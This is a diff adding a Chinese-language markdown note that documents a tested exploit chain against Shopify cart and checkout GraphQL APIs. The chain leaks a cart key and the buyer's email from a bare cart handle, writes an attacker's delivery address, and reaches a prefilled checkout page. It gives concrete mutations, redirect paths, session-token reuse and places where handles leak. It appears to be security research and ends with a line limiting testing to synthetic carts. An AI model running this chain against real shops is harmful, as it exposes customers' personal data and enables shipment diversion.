@@ -1,0 +1,31 @@
+# 利用链（全部实测）
+
+1) 裸 handle 取 key（KB#606/#701 同机理）：
+POST /web/api/graphql
+{"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusNotReady{cart{id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} ... on CartStatusReady{cart{id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}}}}}","variables":{"id":"gid://shopify/Cart/<handle>"}}
+→ 回显 cart.id 带真实 "?key=<KEY>" 与 buyerIdentity.email。
+
+2) 用泄露 KEY 写 cart 地址（cartDeliveryAddressesAdd，userErrors=[]）后提交：
+POST /api/graphql {"query":"mutation Submit($id:ID!,$t:String!){cartSubmitForCompletion(cartId:$id,attemptToken:$t){result{__typename ... on SubmitFailed{checkoutUrl errors{code message}}}}}","variables":{"id":"gid://shopify/Cart/<handle>","t":"<uuid>"}}
+→ SubmitFailed PAYMENTS_METHOD_REQUIRED + checkoutUrl=https://<shop>/cart/c/<handle>（不带 key）；带 key 时 checkoutUrl 带 ?key=<KEY>。
+
+3) 决定性：GET https://<shop>/cart/c/<handle>?key=<KEY> 跟随重定向：
+302 shop.app/checkout/<shopId>/cn/<checkout>/<locale>/shoppay?... → 302 https://<shop>/checkouts/cn/<checkout>/<locale> → 200 结账页。
+页面中实测命中：买家 email（buyerProposal.buyerIdentity.email / FilledBuyerIdentityTerms.email）；攻击者地址在 deliveryLines[].destinationAddress，且收货表单 input name="address1" value="..."、name="postalCode" value="..." 已预填；cart note 也在页面数据里。
+
+4) 对照：GET /cart/c/<handle>（不带 key）→ 同样 302 进结账并 200，但生成的 checkout 不序列化 email/地址（buyerIdentity.email=null、shippingAddresses=[]），仅 note/商品可见。
+
+5) 结账会话：页面 meta serialized-sessionToken（AAEB...）可直接用于 POST /checkouts/unstable/graphql
+header x-checkout-one-session-token: <token>
+{"query":"query{ session { sessionToken sourceId sessionType finished checkoutSessionIdentifier } }"}
+→ 200 sessionType=CART_API / sourceId=<checkout id> / finished=false；无 token 对照 INVALID_SESSION_TOKEN。注意该端点的 Mutation 类型 introspection 返回 __type:null。
+
+# 判据
+- 带 key 的 permalink 结账页 HTML 中 grep 到买家 email 与攻击者 street/postcode（表单 value 预填）= 收货改道落到结账层成立。
+- 不带 key 的 permalink 页面 grep 不到 email/地址 = 需要 key 才能带入（说明与 KB#606 的差异来自 key 的有无，而非目标差异）。
+
+# 坑
+- 合成 cart 的 buyerIdentity.email 只有在带 key 的 permalink 路径才进入 checkout；无 key 路径被清空。
+- cart 地址在 submit 后从 cart 清除（已转移到 checkout），裸 handle query 只剩 note。
+- handle 108bit 随机不可枚举，需先有 handle（共享 /cart/c/ 链接、Referer、ShopifyAnalytics.meta.cart.id）。
+- 验证只应使用自建合成 cart；不要触碰真实客户、不要提交支付。
